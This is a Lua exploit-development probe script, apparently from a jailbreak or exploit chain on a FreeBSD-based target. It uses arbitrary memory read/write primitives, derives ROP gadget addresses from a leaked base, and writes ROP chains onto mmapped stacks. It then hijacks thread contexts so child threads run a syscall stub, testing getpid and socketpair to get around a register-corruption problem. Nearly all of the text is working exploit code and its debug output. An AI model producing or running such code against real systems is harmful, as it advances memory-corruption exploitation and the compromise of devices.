-- CRASH_CLASS: LOW
-- PROBE 91k: Use fn_addr stub as child RIP to bypass R10 problem
--
-- Problem: socketpair writes to [R10], and R10 from set_mcontext
-- points to garbage → corrupts Lua VM.
-- Hypothesis: fn_addr (the syscall stub) does "mov r10,rcx; syscall; ret"
-- If RCX at offset 0x060 is restored by set_mcontext, we can pass arg4
-- via RCX and let the stub translate to R10.
--
-- Test A: getpid via stub (verify stub works from child)
-- Test B: socketpair via stub (verify RCX→R10 translation)

print("=== PROBE 91k: STUB-AS-RIP TEST ===")
print("")

local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t={}; for k,v in pairs(syscall.pipe) do t[k]=v end
    t.syscall_no=n; setmetatable(t,getmetatable(syscall.pipe)); return t
end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a)
    local ok,v=pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok,v=pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function q(v)
    if v==nil then return"nil"end
    if type(v)=="table" and v.h then
        local h,l=v.h,v.l; if h<0 then h=h+0x100000000 end
        if l<0 then l=l+0x100000000 end
        return string.format("0x%08X_%08X",h,l)
    end
    return string.format("0x%X",N(v))
end

local stub=syscall.pipe.fn_addr
local SA=syscall.syscall_address
if not SA then print("NO SA") return end
print("stub="..q(stub))
print("SA="..q(SA))

local pid=N(native.fcall_with_rax(stub,20))
print("pid="..pid)

local tc=mk(430); local mm=mk(477)

local inf=memory.alloc(0x200); wd(inf,0x160)
pcall(function() mk(593)(uint64(0),inf) end)
local elo=rd(inf+0x108) or 0; local ehi=rd(inf+0x10C) or 0
if ehi<0 then ehi=ehi+0x100000000 end
if elo<0 then elo=elo+0x100000000 end
local PRDI=uint64(string.format("0x%X%08X",ehi,elo+0xC9DFE))
local PRAX=uint64(string.format("0x%X%08X",ehi,elo+0x992))
local WMOV=uint64(string.format("0x%X%08X",ehi,elo+0x92C67))

local _DI=0x048;local _SI=0x050;local _DX=0x058;local _AX=0x078
local _CS=0x0C0;local _FL=0x0D0;local _IP=0x0E0
local _SP=0x0F8;local _SS=0x100;local _MG=0x108;local _TP=0x110
local _CX=0x060  -- standard FreeBSD: RCX

-- ============================================================
-- Read stub bytes to see what it is
-- ============================================================
print("")
print("--- STUB BYTES ---")
local stub_n=N(stub)
local b={}
for i=0,15 do
    local ok,v=pcall(function() return memory.read_byte(stub_n+i) end)
    if ok then
        table.insert(b,string.format("%02X",N(v)))
    else
        -- Try reading dword and extracting byte
        local dw=rd(stub_n+(i-i%4))
        if dw then
            local shift=i%4
            local byte_val=math.floor(dw/(256^shift))%256
            table.insert(b,string.format("%02X",byte_val))
        else
            table.insert(b,"??")
        end
    end
end
print("  "..table.concat(b," "))

-- Also read SA bytes
local sa_b={}
local sa_n=N(SA)
for i=0,7 do
    local dw=rd(sa_n+(i-i%4))
    if dw then
        local shift=i%4
        local byte_val=math.floor(dw/(256^shift))%256
        table.insert(sa_b,string.format("%02X",byte_val))
    else
        table.insert(sa_b,"??")
    end
end
print("SA: "..table.concat(sa_b," "))

-- ============================================================
-- Mmap pages for child data
-- ============================================================
local pg=0x4000
local ok_s,stk=pcall(function() return mm(uint64(0),uint64(pg),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
local ok_d,dat=pcall(function() return mm(uint64(0),uint64(pg),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
if not (ok_s and ok_d) then print("MMAP FAIL") return end

local shared_a=N(dat)       -- shared+0: test A result
local shared_b=N(dat)+16    -- shared+16: test B result
local fdbuf=N(dat)+32       -- fdbuf: socketpair output
local ts_addr=N(dat)+64     -- timespec for nanosleep
local sl_addr=N(dat)+80     -- short sleep
local tb_addr=N(dat)+96     -- tid buffer
local ctx_addr=N(dat)+0x100 -- context (aligned)

wq(ts_addr,uint64(999)); wq(ts_addr+8,uint64(0))
wq(sl_addr,uint64(0)); wq(sl_addr+8,uint64(50000000))

-- ============================================================
-- TEST A: getpid via STUB (not SA)
-- Verifies the stub function works from a child thread
-- ============================================================
print("")
print("--- A: GETPID VIA STUB ---")

-- Stack chain A: write rv to shared_a, nanosleep
local off=0
wq(N(stk)+off,PRDI); off=off+8
wq(N(stk)+off,uint64(shared_a)); off=off+8
wq(N(stk)+off,WMOV); off=off+8
wq(N(stk)+off,PRDI); off=off+8
wq(N(stk)+off,uint64(ts_addr)); off=off+8
wq(N(stk)+off,PRAX); off=off+8
wq(N(stk)+off,uint64(240)); off=off+8
wq(N(stk)+off,SA); off=off+8

wq(shared_a,uint64(0xBADBADBA))
wq(tb_addr,uint64(0))

-- Context: RIP=stub, RAX=20 (getpid)
-- Zero context area
for o=0,0x1FF,4 do wd(ctx_addr+o,0) end
wq(ctx_addr+_MG,uint64(0x480)); wd(ctx_addr+_FL,0)
wq(ctx_addr+_TP,uint64(0x10000))
wq(ctx_addr+_CS,uint64(0x43)); wq(ctx_addr+_SS,uint64(0x3B))
wq(ctx_addr+_IP,stub)           -- RIP = stub function!
wq(ctx_addr+_SP,uint64(N(stk)))
wq(ctx_addr+_AX,uint64(20))     -- getpid

pcall(function() tc(uint64(ctx_addr),uint64(tb_addr),uint64(0)) end)
local tid_a=rq(tb_addr)
print("tid="..q(tid_a))

native.fcall_with_rax(stub,240,N(sl_addr),0)

local rv_a=rq(shared_a)
print("getpid rv="..q(rv_a).." (expect "..pid..")")

if N(rv_a)==pid then
    print("*** STUB WORKS FROM CHILD ***")
else
    print("stub failed or different behavior")
end

-- ============================================================
-- TEST B: socketpair via STUB with RCX=fdbuf
-- RIP=stub, RAX=135, RDI=1, RSI=1, RDX=0, RCX@0x060=fdbuf
-- ============================================================
print("")
print("--- B: SOCKETPAIR VIA STUB ---")

-- New stack (offset into same page, after chain A)
local stk_b=N(stk)+0x200

off=0
wq(stk_b+off,PRDI); off=off+8
wq(stk_b+off,uint64(shared_b)); off=off+8
wq(stk_b+off,WMOV); off=off+8
wq(stk_b+off,PRDI); off=off+8
wq(stk_b+off,uint64(ts_addr)); off=off+8
wq(stk_b+off,PRAX); off=off+8
wq(stk_b+off,uint64(240)); off=off+8
wq(stk_b+off,SA); off=off+8

wq(shared_b,uint64(0xBADBADBA))
-- Mark fdbuf with sentinel
wd(fdbuf,0xDEAD0001); wd(fdbuf+4,0xDEAD0002)
wq(tb_addr,uint64(0))

-- Context: RIP=stub, RAX=135, RCX@0x060=fdbuf
for o=0,0x1FF,4 do wd(ctx_addr+o,0) end
wq(ctx_addr+_MG,uint64(0x480)); wd(ctx_addr+_FL,0)
wq(ctx_addr+_TP,uint64(0x10000))
wq(ctx_addr+_CS,uint64(0x43)); wq(ctx_addr+_SS,uint64(0x3B))
wq(ctx_addr+_IP,stub)
wq(ctx_addr+_SP,uint64(stk_b))
wq(ctx_addr+_AX,uint64(135))      -- socketpair
wq(ctx_addr+_DI,uint64(1))        -- AF_UNIX
wq(ctx_addr+_SI,uint64(1))        -- SOCK_STREAM
wq(ctx_addr+_DX,uint64(0))        -- protocol
wq(ctx_addr+_CX,uint64(fdbuf))    -- RCX=fdbuf → stub does mov r10,rcx

pcall(function() tc(uint64(ctx_addr),uint64(tb_addr),uint64(0)) end)
local tid_b=rq(tb_addr)
print("tid="..q(tid_b))

native.fcall_with_rax(stub,240,N(sl_addr),0)

local rv_b=rq(shared_b)
local fd0=rd(fdbuf); local fd1=rd(fdbuf+4)
print("socketpair rv="..q(rv_b))
print("fdbuf fd0="..tostring(fd0).." fd1="..tostring(fd1))

if N(rv_b)==0 then
    print("*** SOCKETPAIR SUCCESS VIA STUB ***")
    print("*** RCX→R10 translation CONFIRMED ***")
    if fd0 and fd0>0 and fd0<10000 then
        native.fcall_with_rax(stub,6,fd0)
    end
    if fd1 and fd1>0 and fd1<10000 then
        native.fcall_with_rax(stub,6,fd1)
    end
else
    print("socketpair failed — stub may not translate RCX→R10")
end

print("")
print("canary="..N(native.fcall_with_rax(stub,20)))
print("=== 91k DONE ===")
